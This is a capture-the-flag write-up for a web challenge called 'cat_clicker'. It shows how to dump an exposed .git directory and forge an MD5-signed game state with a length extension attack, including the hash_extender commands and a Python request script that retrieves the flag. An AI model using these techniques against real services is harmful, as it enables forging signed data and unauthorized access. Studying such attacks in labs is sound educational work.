# cat\_clicker (Web 474, 24 solves)

This is a tough web challenge that requires some crypto. The app is a clicker game. We need 13 cats to get the flag, but we can only obtain 12! Checking out the data sent to the server, our cat limit and count (collectively the state in form `{LIMITS} | {CATS}`) is verified with a hash.

## Getting the source
The first thing we need to do to progress is to discover the `/.git/` directory by chance or using DirBuster, which was probably the idea. After that we can clone the repository and extract commit data with [GitTools](https://github.com/internetwache/GitTools).

```sh
./gitdumper.sh http://challs.xmas.htsp.ro:3003/.git/ git
./extractor.sh git git
```

There's only one commit, signed with a fake email, but it contains the source code for the program! The hash is the MD5 of the combination of a secret 64 character values `$secret` and the in the form `$secret | $state`. In addition, the cat limit and count are parsed from the state by `explode()`ing on ` | `.

## Forging a hash
The secret is unknown to us, same with the flag -- they're taken from environment variables. Do we need to somehow crack a 64 character salted (with the state) MD5 hash?

Actually, since the secret is prepended and we have a known hash, we can perform a length extension attack! (hash\_extender)[https://github.com/iagox86/hash\_extender] looks like a great tool for this. A length extension attack relies on the fact that MD5 (and many other hashes) are iteractive over their blocksize and the result is a direct output of the internal state, so the hash of this intermediate state can be "extended".

We can use any hash, so let's just use the one in a new game. `{"state":"12 | 0","hash":"cf13ab76afb625f7f7d6c539c2cb3c84","success":true}`

```sh
git clone https://github.com/iagox86/hash_extender
cd hash_extender
make 
./hash_extender -d " | 12 | 0" -l 64 -s cf13ab76afb625f7f7d6c539c2cb3c84 -a " | 13" -f md5
```

The program gives us a new signature and state:
```
Type: md5
Secret length: 64
New signature: c28217c17f102d42d1b4a0ab33ec10a3
New string: 207c203132207c203080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004802000000000000207c203133
```

The returned string has inserted some null bytes and garbage inbetween our append target and the original string. This is because the original string has to be treated as if it was padded.

Note that we have to remove the ` | ` at the beginning of the string, since the server will prepend this to our input. Now that we have a valid hash for 13 cats, we can just feed this into a request and get the flag!

```python
import requests

state = bytes.fromhex("3132207c203080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004802000000000000207c203133")
print("New state:", state)
hh = "c28217c17f102d42d1b4a0ab33ec10a3"
x = requests.post('http://challs.xmas.htsp.ro:3003/api/buy.php', data={'state': state, 'hash': hh, 'item_id': 2})

print("Flag:", x.json()['item'])
# Flag: X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}
```

Note that even if the secret wasn't aligned to the blocksize and we didn't know the corresponding state the length attack would still work! We could have guessed the length too, trying each length until the server accepted our request.

```
./hash_extender -l 73 -s cf13ab76afb625f7f7d6c539c2cb3c84 -a " | 13" -f md5 -d ""
Type: md5
Secret length: 73
New signature: c28217c17f102d42d1b4a0ab33ec10a3
New string: 80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004802000000000000207c203133

```
